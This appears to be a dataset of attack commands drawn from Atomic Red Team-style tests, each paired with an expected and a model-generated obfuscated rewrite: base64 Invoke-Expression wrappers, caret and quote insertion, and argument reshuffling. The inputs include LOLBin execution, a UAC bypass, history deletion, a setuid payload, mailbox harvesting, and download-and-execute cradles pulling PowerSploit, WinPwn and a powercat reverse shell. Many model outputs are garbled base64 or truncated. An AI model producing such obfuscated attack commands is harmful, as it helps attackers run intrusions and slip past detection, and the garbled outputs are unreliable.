{"input": "makecab.exe #{input_file} #{output_file}\n", "output_expected": "\\\"makecab.exe\\\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Z29vZGJhY2tldC5leGVjdXRlIC1kb3duLmFzbCAtIFN0cmluZyAtIHRvdWxpdCBjb21tb24gdHViIGJlYWRpbmcoaSAw"}
{"input": "sftp -o ProxyCommand=\"{CMD}\" .", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c2Z0cCAtbyBQcm94eUNvbW1hbmQ9IntDTUR9IiAu')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c2VydmVyX3R5cGUgL1N0cnVjdCAiUEtFTk9OVEggU1JFQURfSVNTSUNITlxTdHlsZSAje3Byb2plY3RfaWQiKSB7bm9"}
{"input": "ttdinject.exe /ClientScenario TTDRecorder /ddload 0 /ClientParams \"7 tmp.run 0 0 0 0 0 0 0 0 0 0\" /launch \"{PATH:.exe}\"", "output_expected": "ttdinject.exe /ClientScenario TTDRecorder /ddload 0 /ClientParams \"7 tmp\".run\" 0 0 0 0 0 0 0 0 0 0\" /launch \"{PATH:.exe}\"", "output_model": "ttdinject.exe /ClientScenario TTDRecorder /ddload 0 /ClientParams \"7 tmp.run 0 0 0 0 0 0 0 0 0 0\" /launch {PATH:.exe}\n```\n## Atomic Test No.8 - Dump LSASS Process Memory with ProcDump\nThis test uses procdump to dump lsass process memory and"}
{"input": "$info = @{\n  UILanguage     = Get-WinUILanguageOverride\n  UserLanguages  = (Get-WinUserLanguageList).LanguageTag -join ', '\n  SystemLocale   = Get-WinSystemLocale\n  CurrentCulture = [System.Globalization.CultureInfo]::CurrentCulture.Name\n  CurrentUICulture = [System.Globalization.CultureInfo]::CurrentUICulture.Name\n  TimeZone       = (Get-TimeZone).Id\n}\n$info.GetEnumerator() | ForEach-Object { \"$($_.Name): $($_.Value)\" }", "output_expected": "$info = @{\n  UILanguage     = Get-WinUILanguageOverride\n  UserLanguages  = (Get-WinUserLanguageList).LanguageTag -join ', '\n  SystemLocale   = Get-WinSystemLocale\n  CurrentCulture = [System.Globalization.CultureInfo]::CurrentCulture.Name\n  CurrentUICulture = [System.Globalization.CultureInfo]::CurrentUICulture.Name\n  TimeZone       = (Get-TimeZone).Id\n}\n$info.GetEnumerator() | ForEach-Object { \"$($_.Name): $($_.Value)\" }", "output_model": "$info = @{UILanguage = Get-WinUILanguageOverride UserLanguages = (Get-WinUserLanguageList).LanguageTag -join \", \" SystemLocale = Get-WinSystemLocale CurrentCulture = [System.Globalization.CultureInfo]::CurrentCulture.Name CurrentUICulture = [System.Globalization.CultureInfo]::CurrentUICulture.Name TimeZone = (Get-TimeZone).Id} $info.GetEnumerator() |"}
{"input": "rundll32.exe zipfldr.dll,RouteTheCall file://^C^:^/^W^i^n^d^o^w^s^/^s^y^s^t^e^m^3^2^/^c^a^l^c^.^e^x^e", "output_expected": "rundll32.exe file://^C^:^/^W^i^n^d^o^w^s^/^s^y^s^t^e^m^3^2^/^c^a^l^c^.^e^x^e zipfldr.dll,RouteTheCall", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnaXN0cnVjdCAtZGVjbGlvbmFpbnMgLWNvbHVtbD9zYW1wbGVhZCAje3tpbnB1dDIucGRm')) | Invoke-Expression\""}
{"input": "rundll32.exe C:\\Windows\\System32\\scrobj.dll,GenerateTypeLib {REMOTEURL:.exe}", "output_expected": "\\\"r\\\"\\\"u\\\"\\\"n\\\"\\\"d\\\"\\\"l\\\"\\\"l\\\"\\\"3\\\"\\\"2\\\"\\\".\\\"\\\"e\\\"\\\"x\\\"\\\"e\\\" C:\\Windows\\System32\\scrobj.dll,GenerateTypeLib {REMOTEURL:.exe}", "output_model": "rundll32 scrobj.dll GenerateTypeLib {REMOTEURL:.exe} -nologo"}
{"input": "FILE=`find ~/Library/Preferences/ByHost/com.apple.loginwindow.*.plist -type f | head -1`\nif [ -z \"${FILE}\" ] ; then echo \"No loginwindow plist file found\" && exit 1 ; fi\necho save backup copy to /tmp/\ncp ${FILE} /tmp/t1547007_loginwindow-backup.plist\necho before\nplutil -p ${FILE}\necho overwriting...\n#{exe_path} ${FILE} && echo after && plutil -p ${FILE}\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('RklMRT1gZmluZCB+L0xpYnJhcnkvUHJlZmVyZW5jZXMvQnlIb3N0L2NvbS5hcHBsZS5sb2dpbndpbmRvdy4qLnBsaXN0IC10eXBlIGYgfCBoZWFkIC0xYAppZiBbIC16ICIke0ZJTEV9IiBdIDsgdGhlbiBlY2hvICJObyBsb2dpbndpbmRvdyBwbGlzdCBmaWxlIGZvdW5kIiAmJiBleGl0IDEgOyBmaQplY2hvIHNhdmUgYmFja3VwIGNvcHkgdG8gL3RtcC8KY3AgJHtGSUxFfSAvdG1wL3QxNTQ3MDA3X2xvZ2lud2luZG93LWJhY2t1cC5wbGlzdAplY2hvIGJlZm9yZQpwbHV0aWwgLXAgJHtGSUxFfQplY2hvIG92ZXJ3cml0aW5nLi4uCiN7ZXhlX3BhdGh9ICR7RklMRX0gJiYgZWNobyBhZnRlciAmJiBwbHV0aWwgLXAgJHtGSUxFfQ==')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c2VjdXJpdHkuc3RhcnQudmFsdWUuZG9lICN7dHJvbWVyY2USIiAvcmVtb3ZlfSIgPjxwcm9maWxlLWRldi5leGVjayIg"}
{"input": "rm #{history_path}\n", "output_expected": "rm", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZGF0YXNldC5leGUgI3tmaWxlfQ==')) | Invoke-Expression\""}
{"input": "Start-Process \"shell:AppsFolder\\MicrosoftCorporationII.QuickAssist_8wekyb3d8bbwe!App\"", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U3RhcnQtUHJvY2VzcyAic2hlbGw6QXBwc0ZvbGRlclxNaWNyb3NvZnRDb3Jwb3JhdGlvbklJLlF1aWNrQXNzaXN0Xzh3ZWt5YjNkOGJid2UhQXBwIg==')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U2V0LW5hbWV9ICN7ZmlsZXMgIiAvZHVyYXRpb25zIjtzZXQgJyc=')) | Invoke-Expression\"\nStart-Process shell:AppsFolderMicrosoft"}
{"input": "cp #{payload} /tmp/hello.c\nsudo chown root /tmp/hello.c\nsudo make /tmp/hello\nsudo chown root /tmp/hello\nsudo chmod u+s /tmp/hello\n/tmp/hello\n", "output_expected": "cp", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIGFkZCAiSEtJT0xNRSAtVEhQVFUgRlY2ggRmlyZWZ9IC1yb3dldHMvZXhlIHtjbGllbnQtYWNjZXB0LXVzZXJ"}
{"input": "rundll32 advpack.dll, RegisterOCX {CMD}", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cnVuZGxsMzIgYWR2cGFjay5kbGwsIFJlZ2lzdGVyT0NYIHtDTUR9')) | Invoke-Expression\"", "output_model": "rundll32 advpack.dll, RegisterOCX {CMD}"}
{"input": "cmstp.exe /s \"#{inf_file_uac}\" /au\n", "output_expected": "cmstp.exe /s \"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3RhdHVzLmNvbm5lY3QgJiAic29jaWFsX2FsbG9jay5leGVjdXRpb25fZmlsZW5hbWUxMTAwIHRvcCB7dXBn')) |"}
{"input": "if (!(Test-Path \"$PathToAtomicsFolder\\T1547.001\\src\\SessionManagerBackup.reg\")) { reg.exe export \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\" \"$PathToAtomicsFolder\\T1547.001\\src\\SessionManagerBackup.reg\" /y }\nSet-ItemProperty -Path \"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\" -Name \"BootExecute\" -Value \"#{registry_value}\" -Type MultiString\n", "output_expected": "powershell.exe -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAAaQBmACAAKAAhACgAVABlAHMAdAAtAFAAYQB0AGgAIAAiACQAUABhAHQAaABUAG8AQQB0AG8AbQBpAGMAcwBGAG8AbABkAGUAcgBcAFQAMQA1ADQANwAuADAAMAAxAFwAcwByAGMAXABTAGUAcwBzAGkAbwBuAE0AYQBuAGEAZwBlAHIAQgBhAGMAawB1AHAALgByAGUAZwAiACkAKQAgAHsAIAByAGUAZwAuAGUAeABlACAAZQB4AHAAbwByAHQAIAAiAEgASwBMAE0AXABTAFkAUwBUAEUATQBcAEMAdQByAHIAZQBuAHQAQwBvAG4AdAByAG8AbABTAGUAdABcAEMAbwBuAHQAcgBvAGwAXABTAGUAcwBzAGkAbwBuACAATQBhAG4AYQBnAGUAcgAiACAAIgAkAFAAYQB0AGgAVABvAEEAdABvAG0AaQBjAHMARgBvAGwAZABlAHIAXABUADEANQA0ADcALgAwADAAMQBcAHMAcgBjAFwAUwBlAHMAcwBpAG8AbgBNAGEAbgBhAGcAZQByAEIAYQBjAGsAdQBwAC4AcgBlAGcAIgAgAC8AeQAgAH0ACgBTAGUAdAAtAEkAdABlAG0AUAByAG8AcABlAHIAdAB5ACAALQBQAGEAdABoACAAIgBIAEsATABNADoAXABTAFkAUwBUAEUATQBcAEMAdQByAHIAZQBuAHQAQwBvAG4AdAByAG8AbABTAGUAdABcAEMAbwBuAHQAcgBvAGwAXABTAGUAcwBzAGkAbwBuACAATQBhAG4AYQBnAGUAcgAiACAALQBOAGEAbQBlACAAIgBCAG8AbwB0AEUAeABlAGMAdQB0AGUAIgAgAC0AVgBhAGwAdQBlACAAIgAjAHsAcgBlAGcAaQBzAHQAcgB5AF8AdgBhAGwAdQBlAH0AIgAgAC0AVAB5AHAAZQAgAE0AdQBsAHQAaQBTAHQAcgBpAG4AZwA=", "output_model": "if (!(Test-Path \"$PathToAtomicsFolder\\T1547.001\\src\\SessionManagerBackup.reg\")) { reg.exe export HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager $PathToAtomicsFolder\\T1547.001\\src\\SessionManagerBackup.reg /y } Set-ItemProperty -Path HKLM:\\SYSTEM\\CurrentControlSet"}
{"input": "Connect-AzureAD\n$userprincipalname = \"#{userprincipalname}\"\nRemove-AzureADUser -ObjectId $userprincipalname", "output_expected": "Connect-AzureAD $userprincipalname = \"", "output_model": "Connect-AzureAD $userprincipalname Remove-AzureADUser -ObjectId $userprincipalname Connect-AzureAD Remove-AzureADUser -ObjectId $userprincipalname Connect-AzureAD $userprincipalname Remove-AzureADUser -ObjectId $userprincipalname Connect-AzureAD $userprincipalname Remove-AzureADUser -ObjectId $"}
{"input": "sshpass -p 'pwd101!' ssh testuser1@localhost -T hostname\n", "output_expected": "sshpass ssh testuser1@localhost -T hostname -p pwd101!", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnLXVzZXIuY29t')) | Invoke-Expression\"\nsshpass -p pwd101! ssh testuser1@localhost -T hostname"}
{"input": "kubectl get secrets --all-namespaces\n", "output_expected": "kubectl get secrets --all-namespaces", "output_model": "\"kubectl get secrets --all-namespaces\""}
{"input": "rundll32.exe pcwutl.dll,LaunchApplication #{exe_to_launch}\n", "output_expected": "rundll32.exe p^cw,ut;l.,d;l^l,,;La,u^n^c,hA;p;p;l;ic^a;t;i^on", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVzdHJpbmcubm90aWNzX21hbGUgLWFkZFxTdGVwIHN0YWxsIC9jb25maXJtIGRhdGEuYXBwbGljYXRpb24=')) |"}
{"input": "reg add \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\CredSSP\\Parameters\" /v AllowEncryptionOracle /t REG_DWORD /d 2 /f\n", "output_expected": "reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\CredSSP\\Parameters /v AllowEncryptionOracle /t REG_DWORD /d 2 /f", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIG1ldGEgLUZpbGVuYWwgI3NlcnZpY2VFbmRwb2ludCAiQm90aWNsb3JhcnlFAkFjbGllbnQxIC1SZXBvcnRzIFN"}
{"input": "if [ \"$(uname)\" = 'FreeBSD' ]; then service -e; else systemctl --type=service; fi;\n", "output_expected": "powershell.exe -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAAaQBmACAAWwAgACIAJAAoAHUAbgBhAG0AZQApACIAIAA9ACAAJwBGAHIAZQBlAEIAUwBEACcAIABdADsAIAB0AGgAZQBuACAAcwBlAHIAdgBpAGMAZQAgAC0AZQA7ACAAZQBsAHMAZQAgAHMAeQBzAHQAZQBtAGMAdABsACAALQAtAHQAeQBwAGUAPQBzAGUAcgB2AGkAYwBlADsAIABmAGkAOwA=", "output_model": "if [ \"$(uname)\" = 'FreeBSD' ]; then service -e; else systemctl --type=service; fi"}
{"input": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Find-GPOComputerAdmin -ComputerName #{computer_name} -Verbose\n", "output_expected": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 IEX \"(IWR\" 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Find-GPOComputerAdmin -ComputerName", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('TWFyaWV3IGlkIC1jYXNlCmJvZHktMDAwMDAtMTQzNDgxOjBhOTQyLWEwODgtNGUxYi02NDljLTkwYzE5MWExZDRlNCAtYz"}
{"input": "IEX (New-Object System.Net.Webclient).Downloadstring('https://raw.githubusercontent.com/besimorhino/powercat/ff755efeb2abc3f02fa0640cd01b87c4a59d6bb5/powercat.ps1')\npowercat -c #{server_ip} -p #{server_port}\n", "output_expected": "IEX (New-Object \"System.Net.Webclient).Downloadstring('https://raw.githubusercontent.com/besimorhino/powercat/ff755efeb2abc3f02fa0640cd01b87c4a59d6bb5/powercat.ps1')\" powercat -c", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('IExYWxlIGxvICZIZWxsbyAje3tleSBjbGllbnQgLw==')) | Invoke-Expression\""}
{"input": "Start-Process \"#{exe_binary}\"\nStart-Sleep -Seconds 7\nGet-Process -Name Notepad -ErrorAction SilentlyContinue | Stop-Process -Force", "output_expected": "Start-Process", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U2V0LXVzZXJfaW1wb3J0fQ==')) | Invoke-Expression\""}
{"input": "msedgewebview2.exe --no-sandbox --browser-subprocess-path=\"{PATH_ABSOLUTE:.exe}\"", "output_expected": "msedgewebview2.exe --no-sandbox \\\"--browser-subprocess-path=\"{PATH_ABSOLUTE:.exe}\"\\\"", "output_model": "\"m\"\"s\"\"e\"\"d\"\"g\"\"e\"\"_\"w\"\"e\"\"b\"\"v\"\"i\"\"e\"\"w\"\"e\"\"v\"\"2\"\".exe --no-sandbox --browser-subprocess-path={PATH_ABSOLUTE:.exe}"}
{"input": "reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\" /v CurrentBuildNumber\n", "output_expected": "reg /v CurrentBuildNumber query HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyAje1Byb2Nlc3MiI3tldGFtcC9DZXJ0aWZpY2F0ZSAtLnRhcmdldHNdIC9QcmVkaWNhdGVzIC9BcnRsIE5vd"}
{"input": "xwizard RunWizard /taero /u {00000001-0000-0000-0000-0000FEEDACDC}", "output_expected": "xwizard RunWizard /taero /u {00000001-0000-0000-0000-0000FEEDACDC}", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cG9zYWRpdXRvbWFpbg==')) | Invoke-Expression\""}
{"input": "$file = Get-Item $env:temp\\T1564.001-10.txt -Force\n$file.attributes='System'\n", "output_expected": "$file $env:tempT1564.001-10.txt -Force $file.attributes=System = Get-Item", "output_model": "$file = Get-Item $env:temp\\T1564.001-10.txt -Force $file.attributes='System'"}
{"input": "Scriptrunner.exe -appvscript \"#{payload_path}\"", "output_expected": "Scriptrunner.exe", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('VHJhY2tlZX0gLU1hcnRzIEFjY3Vycw==')) | Invoke-Expression\""}
{"input": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nMS17-10 -noninteractive -consoleoutput", "output_expected": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nMS17-10 -noninteractive -consoleoutput", "output_model": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1') MS17-10 -noninteractive -consoleoutput<|endof"}
{"input": "$key = 'BwIAAAAkAABSU0EyAAQAAAEAAQBhXtvkSeH85E31z64cAX+X2PWGc6DHP9VaoD13CljtYau9SesUzKVLJdHphY5ppg5clHIGaL7nZbp6qukLH0lLEq/vW979GWzVAgSZaGVCFpuk6p1y69cSr3STlzljJrY76JIjeS4+RhbdWHp99y8QhwRllOC0qu/WxZaffHS2te/PKzIiTuFfcP46qxQoLR8s3QZhAJBnn9TGJkbix8MTgEt7hD1DC2hXv7dKaC531ZWqGXB54OnuvFbD5P2t+vyvZuHNmAy3pX0BDXqwEfoZZ+hiIk1YUDSNOE79zwnpVP1+BN0PK5QCPCS+6zujfRlQpJ+nfHLLicweJ9uT7OG3g/P+JpXGN0/+Hitolufo7Ucjh+WvZAU//dzrGny5stQtTmLxdhZbOsNDJpsqnzwEUfL5+o8OhujBHDm/ZQ0361mVsSVWrmgDPKHGGRx+7FbdgpBEq3m15/4zzg343V9NBwt1+qZU+TSVPU0wRvkWiZRerjmDdehJIboWsx4V8aiWx8FPPngEmNz89tBAQ8zbIrJFfmtYnj1fFmkNu3lglOefcacyYEHPX/tqcBuBIg/cpcDHps/6SGCCciX3tufnEeDMAQjmLku8X4zHcgJx6FpVK7qeEuvyV0OGKvNor9b/WKQHIHjkzG+z6nWHMoMYV5VMTZ0jLM5aZQ6ypwmFZaNmtL6KDzKv8L1YN2TkKjXEoWulXNliBpelsSJyuICplrCTPGGSxPGihT3rpZ9tbLZUefrFnLNiHfVjNi53Yg4='\n$Content = [System.Convert]::FromBase64String($key)\nSet-Content $env:Temp\\key.snk -Value $Content -Encoding Byte\nC:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe /r:System.EnterpriseServices.dll /out:\"#{output_file}\" /target:library /keyfile:$env:Temp\\key.snk #{source_file}\nC:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\regsvcs.exe #{output_file}\n", "output_expected": "$key = 'BwIAAAAkAABSU0EyAAQAAAEAAQBhXtvkSeH85E31z64cAX+X2PWGc6DHP9VaoD13CljtYau9SesUzKVLJdHphY5ppg5clHIGaL7nZbp6qukLH0lLEq/vW979GWzVAgSZaGVCFpuk6p1y69cSr3STlzljJrY76JIjeS4+RhbdWHp99y8QhwRllOC0qu/WxZaffHS2te/PKzIiTuFfcP46qxQoLR8s3QZhAJBnn9TGJkbix8MTgEt7hD1DC2hXv7dKaC531ZWqGXB54OnuvFbD5P2t+vyvZuHNmAy3pX0BDXqwEfoZZ+hiIk1YUDSNOE79zwnpVP1+BN0PK5QCPCS+6zujfRlQpJ+nfHLLicweJ9uT7OG3g/P+JpXGN0/+Hitolufo7Ucjh+WvZAU//dzrGny5stQtTmLxdhZbOsNDJpsqnzwEUfL5+o8OhujBHDm/ZQ0361mVsSVWrmgDPKHGGRx+7FbdgpBEq3m15/4zzg343V9NBwt1+qZU+TSVPU0wRvkWiZRerjmDdehJIboWsx4V8aiWx8FPPngEmNz89tBAQ8zbIrJFfmtYnj1fFmkNu3lglOefcacyYEHPX/tqcBuBIg/cpcDHps/6SGCCciX3tufnEeDMAQjmLku8X4zHcgJx6FpVK7qeEuvyV0OGKvNor9b/WKQHIHjkzG+z6nWHMoMYV5VMTZ0jLM5aZQ6ypwmFZaNmtL6KDzKv8L1YN2TkKjXEoWulXNliBpelsSJyuICplrCTPGGSxPGihT3rpZ9tbLZUefrFnLNiHfVjNi53Yg4=' $Content = [System.Convert]::FromBase64String($key) Set-Content $env:Temp\\key.snk -Value $Content -Encoding Byte Microsoft.NET\\Framework\\v4.0.30319\\csc.exe /r:System.EnterpriseServices.dll /out:\"", "output_model": "$key = 'BwIAAAAkAABSU0EyAAQAAAEAAQBhXtvkSeH85E31z64cAX+X2PWGc6DHP9VaoD13CljtYau9SesUzKVLJdHphY5ppg5clHIGaL7nZbp6qukLH0lLEq/vW979G"}
{"input": "rundll32.exe Mshtml.dll,PrintHTML {PATH_ABSOLUTE:.hta}", "output_expected": "rundll32.exe Mshtml.dll,PrintHTML \"{PATH_ABSOLUTE:.hta}\"", "output_model": "rundll32.exe Mshtml.dll,PrintHTML {PATH_ABSOLUTE:.hta}"}
{"input": "runscripthelper.exe surfacecheck \\\\?\\{PATH_ABSOLUTE:.txt} {PATH_ABSOLUTE:folder}", "output_expected": "runscripthelper.exe surfacecheck \\\\?\\{PATH_ABSOLUTE:.txt} {PATH_ABSOLUTE:folder}", "output_model": "runscripthelper.exe surfacecheck \"\\\\?\"{PATH_ABSO\"LUTE:.txt}\" \"{PATH_A\"\"BSOLUTE:folde\"r}\""}
{"input": "chattr -i #{file_to_modify}\n", "output_expected": "\\\"chattr\\\" -i", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cHJvdG9jb2wgI3t0YWdzfQ==')) | Invoke-Expression\""}
{"input": "Set-ItemProperty HKLM:\\SYSTEM\\CurrentControlSet\\Services\\WinSock2\\Parameters -Name AutodialDLL -Value PathToAtomicsFolder\\T1546\\bin\\AltWinSock2DLL.dll\n", "output_expected": "Set-ItemProperty HKLM:\\SYSTEM\\CurrentControlSet\\Services\\WinSock2\\Parameters \"-N\"ame AutodialDLL -Value PathToAtomicsFolder\\T1546\\bin\\AltWinSock2DLL.dll", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U3RhcnQgLVNpZ25hdHVyIC9JbWFnZXMvYmluIC90aGVzfSAiUEFTQ1VUSF9BTlVMTF9CQUxJVF9SRVNURVNUXzAwMD"}
{"input": "$ss = ConvertTo-SecureString \"#{password}\" -AsPlainText -Force\n$cred = New-Object PSCredential -ArgumentList '#{username}', $ss\n$param = @{\n    Credential = $cred\n    Force      = $true\n}\n$null = Connect-AzAccount @param\n$token = (Get-AzAccessToken -ResourceTypeName MSGraph -ErrorAction Stop).token\n$cert = New-SelfSignedCertificate -Subject \"CN=PowerShell Application\" -CertStoreLocation \"Cert:\\CurrentUser\\My\" -KeyExportPolicy Exportable -KeySpec Signature -KeyLength 2048 -KeyAlgorithm RSA -HashAlgorithm SHA256\n$reqResourceAccess = ( @{ \"resourceAccess\" = (@{\"id\"= \"570282fd-fa5c-430d-a7fd-fc8dc98a9dca\"; \"type\"= \"Scope\"}, @{ \"id\"= \"7427e0e9-2fba-42fe-b0c0-848c9e6a8182\"; \"type\"= \"Scope\"}, @{\"id\"= \"37f7f235-527c-4136-accd-4a02d197296e\"; \"type\"= \"Scope\"}, @{\"id\"= \"14dad69e-099b-42c9-810b-d002981feec1\"; \"type\"= \"Scope\"}, @{ \"id\"= \"e1fe6dd8-ba31-4d61-89e7-88639da4683d\"; \"type\"= \"Scope\"}, @{ \"id\"= \"810c84a8-4a9e-49e6-bf7d-12d183f40d01\"; \"type\"= \"Role\"}); \"resourceAppId\" = \"00000003-0000-0000-c000-000000000000\" })\nconnect-mggraph -AccessToken $token\n$context = Get-MgContext       \n$users = get-MgUser\n$app = New-MgApplication -DisplayName \"T1114.002 Atomic Test #1 - Office365 - Remote Email Collection\" -RequiredResourceAccess $reqResourceAccess -Web @{ RedirectUris=\"http://localhost\"; } -KeyCredentials @(@{ Type=\"AsymmetricX509Cert\"; Usage=\"Verify\"; Key=$cert.RawData })\nNew-MgServicePrincipal -AppId $app.appId -AdditionalProperties @{} | Out-Null\n$resourceSPN = Get-MgServicePrincipal -Filter \"AppId eq '$($app.AppId)'\"\n$graphApiApp = Get-MgServicePrincipal -Filter \"DisplayName eq 'Microsoft Graph'\"\n$mailRole = $graphApiApp.AppRoles|Where-Object Value -Eq \"Mail.Read\"\nNew-MgServicePrincipalAppRoleAssignment -ServicePrincipalId $resourceSPN.Id -PrincipalId $resourceSPN.Id -ResourceId $graphApiApp.id -AppRoleId $mailRole.Id\n$mailbox1 = \"#{1st_target_mailbox}\"\n$mailbox2 = \"#{2nd_target_mailbox}\"\n$mailbox3 = \"#{3rd_target_mailbox}\"\n[System.Collections.ArrayList]$selectUsers = @()\nforeach ($user in $users) {if (($user.Mail -eq $mailbox1) -Or ($user.Mail -eq $mailbox2) -Or ($user.Mail -eq $mailbox3)){$selectUsers.Add($user.id)}}\nconnect-mggraph -ClientId $app.AppId -TenantId $context.TenantId -CertificateName $cert.Subjectname.Name\nforeach ($user in $selectUsers) { $url= \"https://graph.microsoft.com/v1.0/users/$($user)/messages\" ; Invoke-MgGraphRequest -Uri $url -Method GET -OutputType PSObject}\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JHNzID0gQ29udmVydFRvLVNlY3VyZVN0cmluZyAiI3twYXNzd29yZH0iIC1Bc1BsYWluVGV4dCAtRm9yY2UKJGNyZWQgPSBOZXctT2JqZWN0IFBTQ3JlZGVudGlhbCAtQXJndW1lbnRMaXN0ICcje3VzZXJuYW1lfScsICRzcwokcGFyYW0gPSBAewogICAgQ3JlZGVudGlhbCA9ICRjcmVkCiAgICBGb3JjZSAgICAgID0gJHRydWUKfQokbnVsbCA9IENvbm5lY3QtQXpBY2NvdW50IEBwYXJhbQokdG9rZW4gPSAoR2V0LUF6QWNjZXNzVG9rZW4gLVJlc291cmNlVHlwZU5hbWUgTVNHcmFwaCAtRXJyb3JBY3Rpb24gU3RvcCkudG9rZW4KJGNlcnQgPSBOZXctU2VsZlNpZ25lZENlcnRpZmljYXRlIC1TdWJqZWN0ICJDTj1Qb3dlclNoZWxsIEFwcGxpY2F0aW9uIiAtQ2VydFN0b3JlTG9jYXRpb24gIkNlcnQ6XEN1cnJlbnRVc2VyXE15IiAtS2V5RXhwb3J0UG9saWN5IEV4cG9ydGFibGUgLUtleVNwZWMgU2lnbmF0dXJlIC1LZXlMZW5ndGggMjA0OCAtS2V5QWxnb3JpdGhtIFJTQSAtSGFzaEFsZ29yaXRobSBTSEEyNTYKJHJlcVJlc291cmNlQWNjZXNzID0gKCBAeyAicmVzb3VyY2VBY2Nlc3MiID0gKEB7ImlkIj0gIjU3MDI4MmZkLWZhNWMtNDMwZC1hN2ZkLWZjOGRjOThhOWRjYSI7ICJ0eXBlIj0gIlNjb3BlIn0sIEB7ICJpZCI9ICI3NDI3ZTBlOS0yZmJhLTQyZmUtYjBjMC04NDhjOWU2YTgxODIiOyAidHlwZSI9ICJTY29wZSJ9LCBAeyJpZCI9ICIzN2Y3ZjIzNS01MjdjLTQxMzYtYWNjZC00YTAyZDE5NzI5NmUiOyAidHlwZSI9ICJTY29wZSJ9LCBAeyJpZCI9ICIxNGRhZDY5ZS0wOTliLTQyYzktODEwYi1kMDAyOTgxZmVlYzEiOyAidHlwZSI9ICJTY29wZSJ9LCBAeyAiaWQiPSAiZTFmZTZkZDgtYmEzMS00ZDYxLTg5ZTctODg2MzlkYTQ2ODNkIjsgInR5cGUiPSAiU2NvcGUifSwgQHsgImlkIj0gIjgxMGM4NGE4LTRhOWUtNDllNi1iZjdkLTEyZDE4M2Y0MGQwMSI7ICJ0eXBlIj0gIlJvbGUifSk7ICJyZXNvdXJjZUFwcElkIiA9ICIwMDAwMDAwMy0wMDAwLTAwMDAtYzAwMC0wMDAwMDAwMDAwMDAiIH0pCmNvbm5lY3QtbWdncmFwaCAtQWNjZXNzVG9rZW4gJHRva2VuCiRjb250ZXh0ID0gR2V0LU1nQ29udGV4dCAgICAgICAKJHVzZXJzID0gZ2V0LU1nVXNlcgokYXBwID0gTmV3LU1nQXBwbGljYXRpb24gLURpc3BsYXlOYW1lICJUMTExNC4wMDIgQXRvbWljIFRlc3QgIzEgLSBPZmZpY2UzNjUgLSBS